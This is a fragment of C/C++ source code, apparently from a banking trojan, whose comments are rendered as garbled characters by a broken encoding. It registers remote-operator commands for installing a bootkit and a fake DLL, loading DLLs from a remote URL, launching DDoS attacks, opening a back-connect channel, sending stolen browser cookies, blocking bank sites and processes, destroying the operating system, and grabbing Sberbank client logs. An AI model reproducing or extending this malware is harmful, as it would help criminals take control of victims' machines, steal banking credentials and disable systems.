	// ���� ������� � ������ ������������������
	if (Manager != NULL)
	{
		PRegisteredCommand Cmd = GetRegisteredCommand(Manager, Command);
		if (Cmd != NULL)
			return Cmd->Method;
	}

	return NULL;
}
//---------------------------------------------------------------------------




void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
{
	// ������������ ��������� ������� ����
	TASKDBG("RegisterAllCommands", "Started with Manager=0x%X Commands=%u", 
		Manager, Commands);

	// ������� ��������� Bootkit �� �����
	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);

	// ������� ��������� Bootkit �� ����� c ���������� ��������������� �������
	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);

	// ������� ���������� �����
	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);

	// ������� ��������� FakeDll
	RegisterCommand(Manager, (PCHAR)"installfakedll", ExecuteInstallFakeDll);

	// ������� grabber
	#ifdef GrabberH
        RegisterCommand(Manager, (PCHAR)CommandGrabber, ExecuteGrabber);
	#endif
	

	//char CommandMultiDownload[] = {'m','u','l','t','i','d','o','w','n','l','o','a','d',0};

	//����� ������� ����� ���, ����� ��� ���������
	//"loaddll decl:WINAPIV|dll.plug|StartHTTP|c-http://site.com'|i-2|"	
	#ifdef ComandLoadDLLH		
		RegisterCommand(Manager, (PCHAR)CommandLoadDllConnect, ExecuteAllCommand);		
	#endif

	//-------------------------------------------------
	// ������� Back Connect
	#ifdef ddosH		
		RegisterCommand(Manager, (PCHAR)CommandDDOS, ExecuteDDOSCommand);		
	#endif
	

	//-------------------------------------------------
	// ������� Back Connect
	#ifdef BackConnectH
        RegisterCommand(Manager, CommandBackConnect, ExecuteBackConnectCommand);
	#endif

	//-------------------------------------------------
	// ������� �������� ��������
	#ifdef StealthBrowserH		
		char CommandSB[] = {'s','b',0};  //sb 127.0.0.1 9999
		RegisterCommand(Manager, CommandSB, ExecuteSBCommand);
    #endif

	//-------------------------------------------------
	// ������� ��� ������� � ������
	#ifdef coocksolH
		RegisterCommand(Manager, (PCHAR)CommandDeleteCookies, ExecuteDeleteCookiesCommand);
		RegisterCommand(Manager, (PCHAR)CommandSendCookies, ExecuteSendCookiesCommand);
	#endif

	#ifdef RuBnkH		
		RegisterCommand(Manager, (PCHAR)Iblock_Url, ExecuteIblock_Url);	
		RegisterCommand(Manager, (PCHAR)Iblock_processblock ,ExecuteIblock_processblock);
	#endif

	#ifdef KillOs_RebootH
		RegisterCommand(Manager, killos, ExecuteKillosCommand);
		RegisterCommand(Manager, Reboot_System, ExecuteRebootCommand);
	#endif
	//-------------------------------------------------

	// �������� ������ *.dat %Temp%
	#ifdef		SBERH
		//RegisterCommand(Manager, (PCHAR)GetSberLog, ExecuteGrabSberLogCommand);
		RegisterCommand(Manager, (PCHAR)Sber::GetSbr, Sber::ExecuteGetSbrCommand);
	#endif

	#ifdef JAVS_PATCHERH
		RegisterCommand(Manager, (PCHAR)UpdatePath, ExecuteUpdatePathCommand);
		RegisterCommand(Manager, (PCHAR)DeletePath, ExecuteDeletePathCommand);
	#endif
}
